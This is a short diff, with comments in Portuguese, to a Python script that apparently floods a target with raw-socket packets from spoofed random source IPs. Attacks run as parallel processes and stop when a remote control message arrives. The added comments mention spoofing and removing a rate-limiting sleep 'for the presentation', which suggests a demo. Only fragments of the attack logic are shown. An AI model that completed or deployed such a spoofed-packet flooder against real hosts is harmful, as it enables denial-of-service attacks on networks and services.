@@ -7,6 +7,8 @@ from struct import *
 from random import randint,randrange
 from multiprocessing import Process
 
+
+# Funcao de spoof IP address
 def get_random_ip():
     not_valid = [10, 127, 169, 172, 192]
 
@@ -174,6 +176,7 @@ def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
                               randint(1800, 65533), int(dest_port), 5840, 54321)
 
         raw_socket.sendto(packet, (dest_ip, 0))
+        #TODO: retirar esse sleep na apresentacao
         sleep(1)
         #print "sending attack"
 
@@ -231,6 +234,7 @@ else:
                 try:
                     proc = Process(target=attack,args=(raw_s,attack_type,local_ip,dest_ip,dest_port))
                     proc.start()
+                    # TODO: Fechar iteration aqui
                     signal = receivemessage(s)
                     if signal.rstrip() == "stop":
                         proc.terminate()
